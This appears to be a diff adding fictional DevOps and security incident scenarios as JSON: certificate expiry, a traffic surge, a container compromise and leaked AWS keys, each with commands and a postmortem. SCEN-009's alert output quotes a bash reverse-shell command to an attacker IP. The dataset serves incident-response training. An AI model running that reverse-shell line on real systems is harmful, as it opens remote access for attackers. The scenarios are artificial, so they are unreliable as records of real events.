+          "threshold_breached": "Certificate expired -320 seconds ago",
+          "payload": {
+            "domain": "api.cloudscale.io",
+            "issuer": "Let's Encrypt",
+            "status": "EXPIRED"
+          }
+        },
+        "acknowledge": {
+          "protocol": "DevOps on-call paged via high-priority PagerDuty schedule. Acknowledged in 40 seconds.",
+          "communication_channel": "#inc-ssl-outage",
+          "incident_commander": "Lead DevOps Engineer (Rachel Green)",
+          "sla_target_minutes": 10,
+          "initial_actions": "Immediate escalation to Cloudflare CDN administrator and DNS team."
+        },
+        "investigation_commands": [
+          {
+            "command": "curl -Iv https://api.cloudscale.io 2>&1 | grep -A 6 'Server certificate:'",
+            "purpose": "Verify live certificate dates, subject, issuer, and validation error."
+          },
+          {
+            "command": "kubectl get certificate -n ingress -o wide",
+            "purpose": "Inspect cert-manager Custom Resource status and check renewal timestamps in Kubernetes."
+          },
+          {
+            "command": "kubectl describe certificaterequest -n ingress",
+            "purpose": "Inspect cert-manager challenge failure logs and ACME DNS-01 verification status."
+          },
+          {
+            "command": "kubectl logs -n cert-manager -l app=cert-manager --tail=100",
+            "purpose": "Check cert-manager controller logs for rate limits or authorization failures."
+          }
+        ],
+        "root_cause": "The automated Let's Encrypt `cert-manager` ACME DNS-01 challenge had been silently failing for 28 days due to an expired AWS IAM API secret key used by Route53 DNS challenge solver. The renewal failure was logging to a suppressed debug channel without alerting on-call engineers, allowing the 90-day certificate to reach expiration without renewal.",
+        "mitigation": {
+          "actions": [
+            "Temporarily enabled Cloudflare Universal SSL Edge Certificate to immediately terminate TLS at Cloudflare edge with valid certificate.",
+            "Updated AWS Route53 IAM credentials on the Kubernetes cert-manager Secret.",
+            "Manually triggered cert-manager certificate re-issuance: `cmctl renew api-cloudscale-io -n ingress`.",
+            "Validated successful ACME challenge completion and loaded new valid certificate into ingress controllers."
+          ],
+          "time_to_mitigate_minutes": 8
+        },
+        "validation": {
+          "verification_commands": [
+            "openssl s_client -servername api.cloudscale.io -connect api.cloudscale.io:443 </dev/null 2>/dev/null | openssl x509 -noout -dates",
+            "curl -Iv https://api.cloudscale.io/v1/ping"
+          ],
+          "outcome": "Certificate shows valid validity window (90 days remaining). SSL handshake succeeds with HTTP 200 across all geographic regions."
+        },
+        "postmortem_rubric": {
+          "timeline": [
+            "00:00 Z - Let's Encrypt certificate reached expiration date",
+            "00:01 Z - Pingdom external synthetic probe alarmed",
+            "00:02 Z - DevOps on-call acknowledged PagerDuty page",
+            "00:04 Z - Cloudflare edge SSL proxy engaged as immediate band-aid",
+            "00:08 Z - Route53 credentials updated and certificate renewed via cmctl",
+            "00:10 Z - Global verification confirmed TLS resolution"
+          ],
+          "five_whys": [
+            "Why did the certificate expire? Cert-manager failed to automatically renew it.",
+            "Why did cert-manager fail? The ACME DNS-01 challenge failed to update Route53 TXT records.",
+            "Why did Route53 update fail? The AWS IAM access key used by cert-manager had expired.",
+            "Why didn't anyone notice? Cert-manager failure metrics were not mapped to a PagerDuty alert.",
+            "Why wasn't external monitoring set up? External SSL expiration probes were configured with a 24-hour check interval instead of continuous alerting."
+          ],
+          "action_items": [
+            {
+              "priority": "P0",
+              "task": "Configure Prometheus blackbox_exporter with alerts firing at 30 days, 14 days, and 7 days prior to SSL expiration.",
+              "owner": "Observability Team"
+            },
+            {
+              "priority": "P1",
+              "task": "Migrate cert-manager DNS-01 authentication to AWS IRSA (IAM Roles for Service Accounts) to eliminate static access keys.",
+              "owner": "DevOps Team"
+            },
+            {
+              "priority": "P2",
+              "task": "Implement dual-certificate management using AWS ACM as automated backup fallback.",
+              "owner": "Platform Team"
+            }
+          ],
+          "blameless_culture_notes": "The team resolved the customer impact in 8 minutes using Cloudflare edge termination. Replacing static IAM keys with IRSA eliminates the root credential failure point permanently."
+        }
+      }
+    },
+    {
+      "id": "SCEN-008",
+      "scenario_id": "ecommerce_traffic_spike_scaling",
+      "company_name": "ShopSphere OmniRetail",
+      "company_type": "E-commerce",
+      "role": "DevOps Engineer",
+      "incident_type": "traffic spike scaling",
+      "severity": "SEV-1 Critical",
+      "title": "Super Bowl Commercial Traffic Surge Overwhelming E-Commerce API Gateways",
+      "summary": "Sudden 20x surge in incoming HTTP traffic following television commercial broadcast overwhelmed Nginx Ingress Controllers and backend microservices, causing connection timeouts and HTTP 504 Gateway Timeouts.",
+      "architecture_context": "Kubernetes cluster on AWS EKS with AWS Karpenter autoscaler, Nginx Ingress Controller, and Node.js microservices.",
+      "steps": {
+        "alert": {
+          "source": "AWS Application Load Balancer Metrics / PagerDuty",
+          "alert_name": "ALBHigh504GatewayTimeouts",
+          "metric": "HTTPCode_Target_5XX_Count > 500/min",
+          "threshold_breached": "3,800 504 Gateway Timeouts per minute",
+          "payload": {
+            "LoadBalancer": "app/shopsphere-prod-alb",
+            "ActiveConnectionCount": "185,000",
+            "TargetResponseTime": "12.4s"
+          }
+        },
+        "acknowledge": {
+          "protocol": "DevOps on-call and Infrastructure Lead paged. Acknowledged in 45 seconds.",
+          "communication_channel": "#war-room-superbowl-surge",
+          "incident_commander": "Director of Infrastructure (Kevin Taylor)",
+          "sla_target_minutes": 5,
+          "initial_actions": "Opened live screen share; initiated emergency autoscaling pre-warming."
+        },
+        "investigation_commands": [
+          {
+            "command": "kubectl top nodes",
+            "purpose": "Check CPU and memory saturation across all Kubernetes cluster worker nodes."
+          },
+          {
+            "command": "kubectl get hpa -n prod",
+            "purpose": "Check Horizontal Pod Autoscaler status, target metrics, and replica limits."
+          },
+          {
+            "command": "kubectl get events -n prod --sort-by='.metadata.creationTimestamp' | tail -n 25",
+            "purpose": "Check for pod scheduling failures, Karpenter node provisioning errors, or AWS EC2 capacity limits."
+          },
+          {
+            "command": "kubectl logs -n ingress-nginx -l app.kubernetes.io/name=ingress-nginx --tail=50",
+            "purpose": "Check ingress controller worker connection limits and backend connection pool status."
+          }
+        ],
+        "root_cause": "The Horizontal Pod Autoscaler (HPA) reacted to the surge by attempting to scale backend pods from 30 to 300 replicas. However, the EKS cluster worker nodes ran out of capacity, and AWS Karpenter node provisioning was throttled by AWS EC2 API `RequestLimitExceeded` rate limiting due to requesting a single instance type (`c5.2xlarge`) that was temporarily out of capacity in the primary availability zone.",
+        "mitigation": {
+          "actions": [
+            "Updated Karpenter NodePool configuration to diversify instance types across multiple families (`c5`, `c5a`, `m5`, `m5a`, `c6i`).",
+            "Manually patched deployment replicas across storefront services to 200: `kubectl scale deployment/storefront-api --replicas=200 -n prod`.",
+            "Enabled Cloudflare 'Under Attack' mode with aggressive 60-second caching for product catalog endpoints to absorb 85% of traffic at the edge.",
+            "Tuned Nginx Ingress `max-worker-connections` from 16,384 to 65,536 in ConfigMap."
+          ],
+          "time_to_mitigate_minutes": 10
+        },
+        "validation": {
+          "verification_commands": [
+            "kubectl get pods -n prod -l app=storefront-api | grep Running | wc -l",
+            "curl -s -w 'Response Time: %{time_total}s | Code: %{http_code}\\n' -o /dev/null https://shopsphere.com"
+          ],
+          "outcome": "Storefront API pods scaled to 220 healthy replicas across 35 diversified EC2 nodes. Latency stabilized to 95ms; ALB 504 errors dropped to zero."
+        },
+        "postmortem_rubric": {
+          "timeline": [
+            "21:15 Z - Super Bowl commercial aired; traffic surged from 10k to 200k RPS",
+            "21:16 Z - ALB began returning 504 Gateway Timeouts",
+            "21:17 Z - War room convened; Karpenter instance shortage identified",
+            "21:21 Z - Instance diversification applied; Cloudflare edge caching activated",
+            "21:27 Z - 200+ pods running; response latency restored to normal"
+          ],
+          "five_whys": [
+            "Why did customers receive 504 errors? The backend services were overloaded and timed out.",
+            "Why didn't they autoscale in time? New pods were stuck in Pending waiting for worker nodes.",
+            "Why didn't Karpenter provision worker nodes? Karpenter was requesting a single instance type that hit AWS stock-outs.",
+            "Why was only one instance type configured? The NodePool manifest had not been configured with instance family diversification.",
+            "Why wasn't the cluster pre-warmed before the commercial? Marketing did not notify infrastructure teams of the exact television broadcast schedule."
+          ],
+          "action_items": [
+            {
+              "priority": "P0",
+              "task": "Configure Karpenter NodePools with minimum 15 diverse EC2 instance types across AMD, Intel, and Graviton.",
+              "owner": "Platform Engineering"
+            },
+            {
+              "priority": "P1",
+              "task": "Establish an automated Event Readiness protocol between Marketing and Infrastructure with scheduled pre-warming.",
+              "owner": "Engineering Manager"
+            },
+            {
+              "priority": "P2",
+              "task": "Configure Cloudflare Cache Rules to cache static product API responses during traffic spikes.",
+              "owner": "DevOps Team"
+            }
+          ],
+          "blameless_culture_notes": "Traffic spikes of this magnitude are extraordinary opportunities. The team adapted quickly, and improving cross-departmental campaign coordination will prevent similar issues."
+        }
+      }
+    },
+    {
+      "id": "SCEN-009",
+      "scenario_id": "fintech_security_intrusion_compromised_pod",
+      "company_name": "VaultPay Global",
+      "company_type": "Fintech",
+      "role": "Security Engineer",
+      "incident_type": "security intrusion",
+      "severity": "SEV-1 Critical",
+      "title": "Compromised Container Runtime & Unauthorized Reverse Shell Execution in Payment VPC",
+      "summary": "Falco runtime security daemon detected an unauthorized bash reverse shell spawn inside a production payment processor container, indicating remote code execution (RCE).",
+      "architecture_context": "Kubernetes cluster with Cilium eBPF network security, Falco runtime threat detection, and AWS GuardDuty in a PCI-DSS certified VPC.",
+      "steps": {
+        "alert": {
+          "source": "Falco / AWS Security Hub / PagerDuty",
+          "alert_name": "FalcoNoticeTerminalShellInContainer",
+          "metric": "Falco Rule: Notice: A shell was spawned in a container with an attached terminal or socket",
+          "threshold_breached": "Rule violation triggered (Critical Security Alert)",
+          "payload": {
+            "rule": "Terminal shell in container",
+            "output": "Warning: Shell spawned in container (user=root container_id=e9a1b2c3d4 image=payment-processor:v1.9.3 cmdline=sh -i >& /dev/tcp/198.51.100.45/4444 0>&1)",
+            "severity": "CRITICAL"
+          }
+        },
+        "acknowledge": {
+          "protocol": "Security Operations Center (SOC) on-call Security Engineer paged immediately. Acknowledged in 30 seconds.",
+          "communication_channel": "#security-incident-sev1-restricted",
+          "incident_commander": "Chief Information Security Officer (CISO)",
+          "sla_target_minutes": 5,
+          "initial_actions": "Restricted incident channel visibility to security response team and platform lead."
+        },
+        "investigation_commands": [
+          {
+            "command": "kubectl get pod -n payment -o wide | grep e9a1b2c3d4",
+            "purpose": "Identify the compromised pod name and hosting worker node."
+          },
+          {
+            "command": "cilium monitor --type drop",
+            "purpose": "Inspect eBPF packet drop monitor for suspicious outbound C2 (command and control) traffic."
+          },
+          {
+            "command": "kubectl exec payment-processor-7b89-x9z -n payment -- ps aux",
+            "purpose": "Capture live process hierarchy and active network sockets in memory before container isolation."
+          },
+          {
+            "command": "crictl inspect --output json e9a1b2c3d4 > /var/log/forensics/container_inspect.json",
+            "purpose": "Collect forensic snapshot of container metadata, volumes, and execution environment."
+          }
+        ],
+        "root_cause": "A critical zero-day vulnerability in an open-source Java XML parser library allowed an attacker to execute an arbitrary remote code injection (RCE) payload via a crafted webhook payload, spawning a reverse shell connecting back to an external attacker IP (`198.51.100.45`).",
+        "mitigation": {
+          "actions": [
+            "Immediately applied Cilium NetworkPolicy isolating the compromised pod and blocking all egress traffic: `cilium policy import quarantine-policy.json`.",
+            "Captured memory core dump of the container process for digital forensics.",
+            "Force-deleted the compromised pod: `kubectl delete pod payment-processor-7b89-x9z -n payment --force --grace-period=0`.",
+            "Blocked the external attacker IP range on AWS Network Firewall across all VPC ingress/egress transit gateways.",
+            "Revoked all temporary AWS STS tokens issued to the pod's IAM Service Account (IRSA)."
+          ],
+          "time_to_mitigate_minutes": 6
+        },
+        "validation": {
+          "verification_commands": [
+            "cilium bpf policy list",
+            "aws guardduty list-findings --detector-id <id> --finding-criteria '{\"Criterion\": {\"severity\": {\"Gte\": 7}}}'",
+            "trivy k8s --namespace payment cluster"
+          ],
+          "outcome": "Attacker session terminated. Forensic memory analysis confirmed no PCI-DSS cardholder data was exfiltrated. Webhook endpoints patched with patched XML parser."
+        },
+        "postmortem_rubric": {
+          "timeline": [
+            "02:14 Z - Attacker delivered exploit payload via webhook API",
+            "02:14 Z - Falco eBPF detected reverse shell and fired P0 alert",
+            "02:15 Z - Security Engineer paged; acknowledged alert",
+            "02:18 Z - Quarantine NetworkPolicy isolated container network traffic",
+            "02:20 Z - Pod memory dumped and terminated; STS tokens revoked",
+            "02:45 Z - Software patch deployed via CI/CD; vulnerability closed"
+          ],
+          "five_whys": [
+            "Why was a shell spawned? An attacker exploited a Remote Code Execution flaw in an XML parser library.",
+            "Why did the container have a shell available? The container was built on a standard Ubuntu base image containing `/bin/sh`.",
+            "Why could the container connect outbound? Default Kubernetes network policies permitted unrestricted outbound internet egress.",
+            "Why was the container running as root? The Dockerfile lacked a non-root `USER` directive.",
+            "How was it caught so fast? Falco runtime security rules detected the unexpected process execution instantly."
+          ],
+          "action_items": [
+            {
+              "priority": "P0",
+              "task": "Migrate all payment microservices to Google Distroless minimal base images without shells or package managers.",
+              "owner": "DevOps Engineering"
+            },
+            {
+              "priority": "P1",
+              "task": "Enforce strict default-deny egress NetworkPolicies across all PCI-DSS production namespaces.",
+              "owner": "Security Engineering"
+            },
+            {
+              "priority": "P2",
+              "task": "Automate instant automated pod quarantine upon Falco high-severity alert triggering.",
+              "owner": "SecOps Automation"
+            }
+          ],
+          "blameless_culture_notes": "Falco runtime security and rapid containment by the Security Engineer prevented data exfiltration. Transitioning to distroless images will eliminate shell execution primitives permanently."
+        }
+      }
+    },
+    {
+      "id": "SCEN-010",
+      "scenario_id": "saas_secret_leakage_public_repo",
+      "company_name": "CloudScale B2B Analytics",
+      "company_type": "SaaS Enterprise",
+      "role": "Security Engineer",
+      "incident_type": "secret leakage",
+      "severity": "SEV-1 Critical",
+      "title": "Production AWS Root IAM Access Keys Leaked in Public GitHub Repository",
+      "summary": "An open-source documentation sample committed by a developer inadvertently included a hardcoded `.env` file containing AWS administrative API access keys and Stripe production credentials.",
+      "architecture_context": "AWS Multi-Account Organization, Stripe Payment API, GitHub Enterprise with public open-source SDK repositories.",
+      "steps": {
+        "alert": {
+          "source": "GitGuardian / GitHub Secret Scanning / AWS GuardDuty",
+          "alert_name": "HighEntropySecretExposedInPublicRepo",
+          "metric": "Secret Match: AWS_ACCESS_KEY_ID + AWS_SECRET_ACCESS_KEY",
+          "threshold_breached": "Public repository exposure confirmed",
+          "payload": {
+            "repository": "cloudscale-io/python-sdk-docs",
+            "commit": "4f9b8c2e1a7",
+            "secret_type": "AWS IAM User Access Key",
+            "detected_at": "2026-05-18T11:22:04Z"
+          }
+        },
+        "acknowledge": {
+          "protocol": "Security on-call paged via PagerDuty High Urgency. Acknowledged in 45 seconds.",
+          "communication_channel": "#incident-secret-leak-p0",
+          "incident_commander": "Lead Security Engineer (Daniel Ortiz)",
+          "sla_target_minutes": 5,
+          "initial_actions": "Convened emergency response team with AWS Admin and Payment Lead."
+        },
+        "investigation_commands": [
+          {
+            "command": "aws iam get-access-key-last-used --access-key-id AKIAIOSFODNN7EXAMPLE",
+            "purpose": "Determine when and by what service the compromised access key was last used."
+          },
+          {
+            "command": "aws cloudtrail lookup-events --lookup-attributes AttributeKey=AccessKeyId,AttributeValue=AKIAIOSFODNN7EXAMPLE --start-time 2026-05-18T10:00:00Z",
+            "purpose": "Perform forensic audit of all API calls executed using the leaked key in AWS CloudTrail."
+          },
+          {
+            "command": "git log -1 -p 4f9b8c2e1a7 -- .env.example",
+            "purpose": "Verify exact commit diff and check if other credentials (e.g. database URLs, Stripe keys) were exposed."
+          }
+        ],
+        "root_cause": "A developer testing an open-source tutorial copied their local production `.env` file into the sample repo under the name `.env.example`, failing to realize the file contained real production credentials rather than dummy placeholder values.",
+        "mitigation": {
+          "actions": [
+            "Immediately deactivated the compromised AWS IAM access key: `aws iam update-access-key --access-key-id AKIAIOSFODNN7EXAMPLE --status Inactive`.",
+            "Rotated the production Stripe secret key in the Stripe Dashboard and updated production services via HashiCorp Vault.",
+            "Purged the sensitive commit from the public Git repository history using `git-filter-repo` and force pushed with lease.",
+            "Permanently deleted the compromised AWS access key: `aws iam delete-access-key --access-key-id AKIAIOSFODNN7EXAMPLE`."
+          ],
+          "time_to_mitigate_minutes": 7
+        },
+        "validation": {
+          "verification_commands": [
+            "aws sts get-caller-identity --output json",
+            "aws cloudtrail lookup-events --lookup-attributes AttributeKey=AccessKeyId,AttributeValue=AKIAIOSFODNN7EXAMPLE",
+            "trufflehog github --repo https://github.com/cloudscale-io/python-sdk-docs"
+          ],
+          "outcome": "Compromised key revoked; subsequent CloudTrail queries confirm zero unauthorized API calls were made during the 7-minute exposure window. TruffleHog scan of the public repo returned clean."
+        },
+        "postmortem_rubric": {
+          "timeline": [
+            "11:20 Z - Commit pushed to public GitHub repository",
+            "11:22 Z - GitGuardian and GitHub Secret Scanning detected key and fired alert",
+            "11:23 Z - Security Engineer paged; acknowledged alert",
+            "11:25 Z - IAM Access Key deactivated in AWS console",
+            "11:28 Z - CloudTrail audited; confirmed no unauthorized calls",
+            "11:32 Z - Git history purged and Stripe keys rotated"
+          ],
+          "five_whys": [
+            "Why was the secret exposed? A real `.env` file was committed as `.env.example`.",
+            "Why was a real `.env` file used? The developer copied their local development file without checking values.",
+            "Why wasn't it blocked locally? The developer did not have pre-commit hooks installed on their workstation.",
+            "Why did an administrative IAM key exist? The user account had been granted long-lived keys for testing months ago.",
+            "Why weren't long-lived keys disabled? IAM credential rotation policies had not enforced automated key expiration."
+          ],
+          "action_items": [
+            {
+              "priority": "P0",
+              "task": "Enforce mandatory pre-commit hooks (TruffleHog / Gitleaks) via automated workstation MDM configuration.",
+              "owner": "Security Engineering"
+            },
+            {
+              "priority": "P1",
+              "task": "Eliminate all long-lived IAM user keys; mandate AWS IAM Identity Center (SSO) with temporary credentials.",
+              "owner": "Cloud Security"
+            },
+            {
+              "priority": "P2",
+              "task": "Enable GitHub secret scanning push protection across all organization repositories.",
+              "owner": "DevOps Team"
+            }
+          ],
+          "blameless_culture_notes": "Human developers make mistakes when juggling multiple configuration files. Automated pre-commit hooks, GitHub push protection, and eliminating static keys will prevent this class of incident permanently."
+        }
+      }
+    }
+  ]
+}
